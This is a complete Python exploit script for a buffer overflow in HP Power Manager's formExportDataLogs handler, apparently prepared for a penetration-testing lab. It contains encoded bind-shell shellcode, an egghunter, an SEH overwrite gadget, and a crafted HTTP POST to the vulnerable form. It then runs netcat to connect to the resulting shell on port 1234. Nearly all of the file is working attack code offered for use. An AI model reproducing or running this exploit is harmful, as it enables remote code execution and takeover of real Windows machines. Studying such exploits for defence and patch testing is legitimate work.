#!/usr/bin/python
print """
##//#############################################################################################################
##							##							#
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow	 		#
## 							##  HP Power Manager				 	#
## Vulnerable Application: HP Power Manager	 	##  This is a part of the Metasploit Module, 		#
## Tested on Windows [Version 6.1.7600] 		##  exploit/windows/http/hp_power_manager_filename	#
##							##							#
## Author: Muhammad Haidari				##  Spawns a shell to same window			#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##							#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>
"""
import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python


egg="b33fb33f"
buf= egg
buf += "\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x82\x95\xb7\x92\x83\xee\xfc\xe2\xf4\x7e\x7d"
buf += "\x35\x92\x82\x95\xd7\x1b\x67\xa4\x77\xf6\x09\xc5\x87"
buf += "\x19\xd0\x99\x3c\xc0\x96\x1e\xc5\xba\x8d\x22\xfd\xb4"
buf += "\xb3\x6a\x1b\xae\xe3\xe9\xb5\xbe\xa2\x54\x78\x9f\x83"
buf += "\x52\x55\x60\xd0\xc2\x3c\xc0\x92\x1e\xfd\xae\x09\xd9"
buf += "\xa6\xea\x61\xdd\xb6\x43\xd3\x1e\xee\xb2\x83\x46\x3c"
buf += "\xdb\x9a\x76\x8d\xdb\x09\xa1\x3c\x93\x54\xa4\x48\x3e"
buf += "\x43\x5a\xba\x93\x45\xad\x57\xe7\x74\x96\xca\x6a\xb9"
buf += "\xe8\x93\xe7\x66\xcd\x3c\xca\xa6\x94\x64\xf4\x09\x99"
buf += "\xfc\x19\xda\x89\xb6\x41\x09\x91\x3c\x93\x52\x1c\xf3"
buf += "\xb6\xa6\xce\xec\xf3\xdb\xcf\xe6\x6d\x62\xca\xe8\xc8"
buf += "\x09\x87\x5c\x1f\xdf\xfd\x84\xa0\x82\x95\xdf\xe5\xf1"
buf += "\xa7\xe8\xc6\xea\xd9\xc0\xb4\x85\x6a\x62\x2a\x12\x94"
buf += "\xb7\x92\xab\x51\xe3\xc2\xea\xbc\x37\xf9\x82\x6a\x62"
buf += "\xf8\x8a\xcc\xe7\x70\x7f\xd5\xe7\xd2\xd2\xfd\x5d\x9d"
buf += "\x5d\x75\x48\x47\x15\xfd\xb5\x92\x86\x47\x3e\x74\xe8"
buf += "\x85\xe1\xc5\xea\x57\x6c\xa5\xe5\x6a\x62\xc5\xea\x22"
buf += "\x5e\xaa\x7d\x6a\x62\xc5\xea\xe1\x5b\xa9\x63\x6a\x62"
buf += "\xc5\x15\xfd\xc2\xfc\xcf\xf4\x48\x47\xea\xf6\xda\xf6"
buf += "\x82\x1c\x54\xc5\xd5\xc2\x86\x64\xe8\x87\xee\xc4\x60"
buf += "\x68\xd1\x55\xc6\xb1\x8b\x93\x83\x18\xf3\xb6\x92\x53"
buf += "\xb7\xd6\xd6\xc5\xe1\xc4\xd4\xd3\xe1\xdc\xd4\xc3\xe4"
buf += "\xc4\xea\xec\x7b\xad\x04\x6a\x62\x1b\x62\xdb\xe1\xd4"
buf += "\x7d\xa5\xdf\x9a\x05\x88\xd7\x6d\x57\x2e\x57\x8f\xa8"
buf += "\x9f\xdf\x34\x17\x28\x2a\x6d\x57\xa9\xb1\xee\x88\x15"
buf += "\x4c\x72\xf7\x90\x0c\xd5\x91\xe7\xd8\xf8\x82\xc6\x48"
buf += "\x47"


#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

hunter =  ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "\x41" * (721 -len(hunter))
buffer +="\x90"*30 + hunter
buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
 

content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Payload Fired... She will be back in less than a min..."
s.send(payload)
print "[+] Give me 30 Sec!"
time.sleep(30)
os.system("nc -nv " + HOST +" 1234")
s.close()
print "[+] Did you get your Proof.txt file?!?"
#note if you didn't get a bindshell, you may have to bump it to a minute time.sleep(60).

